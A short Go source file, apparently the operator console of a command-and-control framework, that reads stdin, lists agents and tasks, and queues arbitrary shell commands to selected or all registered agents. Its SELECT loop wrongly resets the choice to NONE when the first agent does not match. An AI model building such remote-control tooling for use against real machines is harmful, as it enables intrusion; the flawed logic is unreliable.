package c2

import (
	"bufio"
	"log/slog"
	"os"
	"strconv"
	"strings"
	"sync"
)

var mu sync.Mutex

func GetCommands() {
	for {
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		mu.Lock()
		isShellCommand := true
		for _, command := range commands {
			if strings.Contains(input, command) {
				go RunCommand(input)
				isShellCommand = false
				break
			}
		}
		if isShellCommand {
			if state.SelectedAgent == "ALL" {
				for _, agent := range state.RegisteredAgents {
					state.Tasks = append(state.Tasks, Task{Command: input, Agent: agent})
				}
			} else if state.SelectedAgent != "NONE" {
				state.Tasks = append(state.Tasks, Task{Command: input, Agent: state.SelectedAgent})
			}
		}
		mu.Unlock()
	}
}

var commands = []string{"SELECT", "AGENTS", "TASKS"}

func RunCommand(command string) {
	if strings.Contains(command, "SELECT") {
		mu.Lock()
		state.SelectedAgent = strings.TrimSpace(strings.TrimPrefix(command, "SELECT "))
		if state.SelectedAgent == "ALL" {
			slog.Info("Selected all agents")
		} else {
			for _, agent := range state.RegisteredAgents {
				if state.SelectedAgent == agent {
					slog.Info("Selected agent with UUID: " + state.SelectedAgent)
					break
				} else {
					slog.Info("No registered agent found with UUID: " + state.SelectedAgent)
					state.SelectedAgent = "NONE"
				}
			}
		}
		mu.Unlock()
	} else if strings.Contains(command, "AGENTS") {
		if len(state.RegisteredAgents) == 0 {
			slog.Info("No agents Registered")
		} else {
			for i := range len(state.RegisteredAgents) {
				slog.Info("Agent " + strconv.Itoa(i) + ": " + state.RegisteredAgents[i])
			}
		}
	} else if strings.Contains(command, "TASKS") {
		if len(state.Tasks) == 0 {
			slog.Info("No tasks in queue")
		} else {
			for i, task := range state.Tasks {
				slog.Info("Task " + strconv.Itoa(i) + ": " + " Command: " + task.Command + " Recipient: " + task.Agent)
			}
		}
	} else {
		return
	}
}
